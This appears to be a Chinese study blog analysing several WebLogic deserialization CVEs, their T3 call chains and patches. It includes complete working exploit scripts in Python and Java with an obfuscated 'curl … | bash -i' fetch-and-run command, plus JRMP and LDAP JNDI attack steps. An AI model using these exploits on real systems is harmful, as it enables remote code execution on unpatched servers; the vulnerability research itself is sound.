---
layout: post
title: Weblogic学习
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzq
---

 

## CVE-2015-4852分析

### 环境配置（K:\*\weblogic\newfile\WeblogicEnvironment-master）

```java
https://tttang.com/user/RoboTerh  //直接参考这篇文章即可
https://bleke.top/posts/2831946175/  weblogic调试环境
```

### 抓包分析

![image-20240618141748571](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618141748571.png)

第一步客户端向服务器发送请求头，得到服务端的响应
```java
t3 7.0.0.0   //标识协议版本号
AS:10        //标识发送序列化数据的容量
HL:19       

HELO:10.3.6.0.false   //weblogic版本号
AS:2048
HL:19
```

![image-20240618143102259](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618143102259.png)

### 这里先提一个疑问叭初次的困点

这里直接发了个正确的poc到了readObject()这里， 但是想的是比如/cmd路由下访问才进行的readObject(),那么这里是

![image-20240618144900025](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618144900025.png)呃呃呃好像明白了，就是在它程序启动的时候init()-->readMsgAbbrevs--->read->readObject调用的

### 调试步骤

```
从输入流var1中读取一个字节，并将其赋值给变量var2，该字节表示序列化对象的类型
```

![image-20240618145902485](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618145902485.png)

继续看ServerChannelInputStream，是一个内部类，但是里面重写了**resolveClass()方法**

```
// 检查解析出来的Java类与要解析的类是否具有相同的serialVersionUID
```

![image-20240618150313202](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618150313202.png)

其中在构造方法中，调用getServerChannel函数处理T3协议，获取socket相关信息
[  ](https://xzfile.aliyuncs.com/media/upload/picture/20231020163724-e48e54b0-6f23-1.png)
![image-20240618151333147](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618151333147.png)


![image-20240618152245048](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618152245048.png)

### exp

```java
from os import popen
import struct  # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget, cmd):
    YSO_PATH = "C:\\Users\\c'x'k\\Desktop\\yso\\ysoserial-master\\target\\ysoserial-0.0.6-SNAPSHOT-all.jar"
    popen = subprocess.Popen(['C:/Program Files/Java/jdk1.8.0_65/bin/java.exe', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    print(data.decode())
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: " + "".join(match))
    else:
        print("Not Weblogic")
        return
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header + desflag + payload


    payload = struct.pack(">I", len(payload)) + payload[4:]

    print(payload)
    sock.send(payload)

if __name__ == "__main__":
    ip = "192.168.236.130"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "bash -c {echo,Y3VybCBodHRwOi8vMTkyLjE2OC4yMzYuMTMwOjQ0NDQ=}|{base64,-d}|{bash,-i}"
    payload = generatePayload(gadget, cmd)
    T3Exploit(ip, port, payload)
```

主要看T3Exploit中的方法
```java
看下图  前面的是长度，会在代码层面读取是否为0，为0会进入readObject方法内，然后后面是 aced005就是我们自己反序列化的东西
```

![image-20240618155623767](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618155623767.png)

![image-20240618160701335](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618160701335.png)

### 调用链子

![image-20240618171931171](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618171931171.png)

### 总结一下

```java
其实就是 拼接 00000000 +T3头+反序列化对象前缀+恶意反序列化对象，然后下面struct.paack()就是重新计算加入恶意数据包的长度
WeblogicT3对RMI传递过来的数据处理过程非常复杂，分析起来可能会有点头疼，但只要始终记住，Weblogic处理数据时，会对数据按照序列化头部标识进行分片，并逐个反序列化，就明白为什么会触发恶意代码了。	
```

![image-20240618163233054](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618163233054.png)



## CVE-2016-0638(StreamMessageImpl+CC1)分析

环境搭建直接参考上面的url即可：stop后，直接docker restart重启容器即可
搭建完环境，直接看下补丁.

重点关注一下`InboundMsgAbbrev`这个类，因为它重写了 resolveClass的方法
发现多了一个`isBlackListed`黑名单校验的方法

![image-20240619151420998](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619151420998.png)

跟进去发现黑名单是这几个

![image-20240619151524512](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619151524512.png)

然后黑名单首先将className判断了一次，然后后面截取最后一个小数点前，又进行了一次判断
![image-20240619152158207](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619152158207.png)

最终调试发现是到，ChainedTransformer的时候报错了
![image-20240619152827418](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619152827418.png)

初始化黑名单的方法（ClassFilter.class）,是一个静态方法所以会优先加载，这里就是两个相关的配置

 ```java
 static {
         if (!isBlackListDisabled()) {
             if (!isDefaultBlacklistEntriesDisabled()) {
                 updateBlackList("+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure");
             }
 
             updateBlackList(System.getProperty("weblogic.rmi.blacklist", (String)null));
         }
 
     }
 ```

ClassFilter.isBlackListed方法同样作用于MsgAbbrevInputStream的resolveClass方法，对其传入的类名进行了同样的黑名单过滤。
```java
protected Class resolveClass(ObjectStreamClass descriptor) throws InvalidClassException, ClassNotFoundException {
    // 通过synchronized关键字锁定了lastCTE对象，以保证线程安全
    synchronized(this.lastCTE) {
        // 获取类名
        String className = descriptor.getName();
        // 如果className不为空，并且其长度大于0，并且该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常
        if (className != null && className.length() > 0 && ClassFilter.isBlackListed(className)) {
            throw new InvalidClassException("Unauthorized deserialization attempt", descriptor.getName());
        }
        // 获取当前线程的类加载器ClassLoader
        ClassLoader ccl = RJVMEnvironment.getEnvironment().getContextClassLoader();
        // 如果lastCTE对象中的clz为null，或者lastCTE对象中的ccl不等于当前线程的类加载器ccl，则重新加载类
        if (this.lastCTE.clz == null || this.lastCTE.ccl != ccl) {
            String classname = this.lastCTE.descriptor.getName();
            // 如果是PreDiablo的对等体，则调用JMXInteropHelper.getJMXInteropClassName()方法获取Interop的类名
            if (this.isPreDiabloPeer()) {
                classname = JMXInteropHelper.getJMXInteropClassName(classname);
            }
            // 从PRIMITIVE_MAP（一个Map集合）中获取classname对应的Class对象
            this.lastCTE.clz = (Class)PRIMITIVE_MAP.get(classname);
            // 如果获取失败，则调用Utilities.loadClass()方法，加载classname对应的Class对象
            if (this.lastCTE.clz == null) {
                this.lastCTE.clz = Utilities.loadClass(classname, this.lastCTE.annotation, this.getCodebase(), ccl);
            }

            this.lastCTE.ccl = ccl;
        }

        this.lastClass = this.lastCTE.clz;
    }

    return this.lastClass;
}
```

**注**：MsgAbbrevInputStream用于反序列化RMI请求，将请求参数和返回结果转换为Java对象。InboundMsgAbbrev用于处理入站RMI请求，检查和验证请求的合法性，并保证请求的安全性和可靠性

##### 这里是对CVE-2015-4852补丁的一个绕过，这个漏洞主要是找到了个黑名单之外的类`weblogic.jms.common.StreamMessageImpl`

很容易找到这里的反序列化点，那么就是找谁调用了`readExternal`
![image-20240619161846259](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619161846259.png)

#### exp

```java
package com.supeream;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.jms.common.StreamMessageImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2016_0638 {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public byte[] getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"bash -c {echo,Y3VybCBodHRwOi8vMTkyLjE2OC4yMzYuMTMwOjQ0NDQ=}|{base64,-d}|{bash,-i}"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler);
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        byte[] serializeData=serialize(handler);
        return serializeData;
    }

    public static void main(String[] args) throws Exception {
        byte[] payloadObject = new CVE_2016_0638().getObject();
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(payloadObject,payloadObject.length);
        byte[] payload2 = Serializables.serialize(streamMessage);
        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);
    }
}
```

先从exp简单分析一下
```java
getObject()方法是一条完整的CC1链子，返回的是序列化的字节码

 byte[] payloadObject = new CVE_2016_0638().getObject();  //CC1序列化的字节码
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(payloadObject,payloadObject.length); //设置了 字节码,字节码长度
        byte[] payload2 = Serializables.serialize(streamMessage);   //序列化streamMessage对象为了字节码
        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);//这个就是T3协议发送这个payload2

序列化了二层，外面的是StreamMessage的，里面是CC1的
猜测后端解析的时候，首先反序列化解析StreamMessage的，然后解析CC1的
```

```java
// 如果消息类型为1，则表示该消息是一个普通的消息。该方法将从ObjectInput中读取PayloadStream对象，并将其用ObjectInputStream进行反序列化，最后将反序列化后的Java对象通过writeObject方法写入消息中
            case 1:
                // 从ObjectInput对象中读取PayloadStream对象，并将其作为InputStream对象传递给createPayload方法
                this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);
                // 将从PayloadStream对象中获取一个BufferInputStream对象，并将其作为参数传递给ObjectInputStream类的构造函数
//所以是二层反序列化
```

![image-20240619175410210](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619175410210.png)

#### 调用链

![image-20240619164548714](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619164548714.png)

#### 原理

```java
绕过原理：先将恶意的反序列化对象封装在StreamMessageImpl对象中，然后再对StreamMessageImpl对象进行反序列化，将生成的payload发送至目标服务器。·
目标服务器拿到payload字节码后，读取到类名StreamMessageImpl，此类名不在黑名单中，故可以绕过resolveClass中的过滤。在调用StreamMessageImpl的readObject时，底层会调用其readExternal方法，对封装的序列化数据进行反序列化，从而调用恶意类的readObject函数
```

#### 思考

假设找到了这处反序列化的点，如何构造exp 
从`InboundMsgAbbrev#readObject`方法开始分析，这里会进入ObjectInputStream#readObject()方法中

![image-20240620103019245](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620103019245.png)

然后会调用readObject0方法
![image-20240620103201114](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620103201114.png)

然后在这里会switch读取bin中流的信息，然后做case分支调用
![image-20240620105751888](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620105751888.png)

进入`readOrdinaryObject`方法中，

```java
 private Object readOrdinaryObject(boolean unshared)
        throws IOException
    {
        if (bin.readByte() != TC_OBJECT) {//这里也是读取，然后对115的一个判断，感觉是防止反射调用
            throw new InternalError();
        }

        ObjectStreamClass desc = readClassDesc(false);
        desc.checkDeserialize();

        Class<?> cl = desc.forClass();//这里会监测类型  "class weblogic.jms.common. StreamMessageImpl"
        if (cl == String.class || cl == Class.class
                || cl == ObjectStreamClass.class) {
            throw new InvalidClassException("invalid class descriptor");
        }

        Object obj;
        try {
            obj = desc.isInstantiable() ? desc.newInstance() : null;//进行了一个实例化
        } catch (Exception ex) {
            throw (IOException) new InvalidClassException(
                desc.forClass().getName(),
                "unable to create instance").initCause(ex);
        }

        passHandle = handles.assign(unshared ? unsharedMarker : obj);
        ClassNotFoundException resolveEx = desc.getResolveException();
        if (resolveEx != null) {
            handles.markException(passHandle, resolveEx);
        }

        if (desc.isExternalizable()) {
            readExternalData((Externalizable) obj, desc);
```

然后调用到`readExternalData`方法中，
![image-20240620112708043](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620112708043.png)

然后最后
![image-20240620114536033](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620114536033.png)

![image-20240620114546193](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620114546193.png)

#### 修复方案：

把`StreamMessageImpl#readExternal`中的ObjectInputStream换成了自定义的FilteringObjectInputStream()

![image-20240620142634525](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620142634525.png)

## CVE-2016-3510分析(MarshalledObject+cc1)

此漏洞的利用方式与CVE-2016-0638一致，只不过这里不再借助StreamMessageImpl类，而是借助MarshalledObject类

鉴于分析了前者，这个尝试自己探索一下
很清楚发现是用了`readResolve()`方法中进行了readObject()

```java
历程：看了从readObject()--->readObject0()-->readOrdinaryObject()但是没找到哪里调用了readResolve() 
```

![image-20240620143500703](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620143500703.png)

类中的`MarshalledObject`方法是对字节码objBytes进行赋值的

![image-20240620144036381](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620144036381.png)



#### 调用分析：

前面都是相同的

![image-20240620160016669](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620160016669.png)

用的是下面这个invoke反射方法

![image-20240620162228790](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620162228790.png)

但是可以发现invoke的其实是null的方法

![image-20240620160454320](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620160454320.png)

但是到了这里name突然变成了readResolve()  `这个还是优点不理解`

![image-20240620162319962](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620162319962.png)

#### 调用链子	

![image-20240620162359449](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620162359449.png)

在CVE0638的基础上改了一下，竟然直接通了
![image-20240620155536774](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620155536774.png)

![image-20240620155528596](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620155528596.png)

```java
package com.supeream;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.corba.utils.MarshalledObject;
import weblogic.jms.common.StreamMessageImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2016_3510 {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public byte[] getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"bash -c {echo,Y3VybCBodHRwOi8vMTkyLjE2OC4yMzYuMTMwOjQ0NDQ=}|{base64,-d}|{bash,-i}"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler);
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        MarshalledObject marshalledObject=new MarshalledObject(handler);
        byte[] payload2 = Serializables.serialize(marshalledObject);
        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);



        byte[] serializeData=serialize(handler);
        return new byte[5];
    }

    public static void main(String[] args) throws Exception {



        byte[] payloadObject = new CVE_2016_3510().getObject();
//        StreamMessageImpl streamMessage = new StreamMessageImpl();
//        streamMessage.setDataBuffer(payloadObject,payloadObject.length);
//        byte[] payload2 = Serializables.serialize(streamMessage);
//        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);
    }
}
```

抄过来一段总结

```java
在Java中，当一个对象被序列化时，会将对象的类型信息和对象的数据一起写入流中。当流被反序列化时，Java会根据类型信息创建对象，并将对象的数据从流中读取出来，然后调用对象中的readObject方法将数据还原到对象中，最终返回一个Java对象。在Weblogic中，当从流量中获取到普通类序列化数据的类对象后，程序会依次尝试调用类对象中的readObject、readResolve、readExternal等方法，以恢复对象的状态。

readObject方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法可以被对象重写，以实现自定义的反序列化逻辑。

readResolve方法是Java中的一个成员方法，用于在反序列化后恢复对象的状态。当对象被反序列化后，Java会检查对象中是否存在readResolve方法，如果存在，则会调用该方法恢复对象的状态。

readExternal方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法通常被用于实现Java标准库中的可序列化接口Externalizable，以实现自定义的序列化逻辑。
```

#### 修复方案：

在`MarshalledObject`#readResolve()中，创建了一个匿名类的resolveClass()方法加了黑名单，和上面一样。

![image-20240620164915729](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620164915729.png)

## JRMP打WebLogic的链子

先测试：WebLogic版本是10.3.6.0的

![image-20240709173014181](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240709173014181.png)

 1、首先开启了一个`JRMPListener`的服务（这里我感觉是启动了一个恶意的服务端）

![image-20240709173107729](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240709173107729.png)

2、   7001是weblogic端口，后面的4444是上面恶意服务端的端
![image-20240709173353293](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240709173353293.png)

分析一下：估计就是通过python 脚本，给weblogic发送了一个恶意序列化串，然后反序列化会调用恶意服务端的恶意链子，再反序列化RCE。。呃呃呃感觉不太对，这样不就二次反序列化了嘛。

python2 44553.py 10.0.22.65 7001 ./ysoserial.jar 10.0.22.65 4444 JRMPClient

```java
 dip = sys.argv[1]  #10.0.22.65
    dport = int(sys.argv[2])#7001
    path_ysoserial = sys.argv[3]#./ysoserial.jar
    jrmp_listener_ip = sys.argv[4]#10.0.22.65
    jrmp_listener_port = sys.argv[5]#4444
    jrmp_client = sys.argv[6]#JRMPClient
```

利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler，并使用UnicastRef和远端建立tcp连接，获取RMI registry，序列化之后发送给weblogic，weblogic会请求我们的JRMPListener，然后将获取的内容利用readObject()进行解析，导致恶意代码执行。

禁用了java.rmi.registry.Registry之后

![image-20240710102649791](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240710102649791.png)

直接反序列化UnicastRef对象
使用java.rmi.registry.Registry之外的类。廖新喜用的`java.rmi.activation.Activator`

## Weblogic CVE-2021-2109

我们可以通过LDAP协议方式实现JNDI注入攻击，加载远程CodeBase下的恶意类 ldap://127.0.0;1:1389/EvilObject，由于代码中会自动补全一个.因此可以将context定位为ldap://127.0.0将bindName定位为1:1389/EvilObject，最后的serverName必须为AdminServer，因此构造完整的PoC后，漏洞利用效果如图：：

修复方案，加了一个isValidJndiSchema函数
![image-20240710104753253](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240710104753253.png)
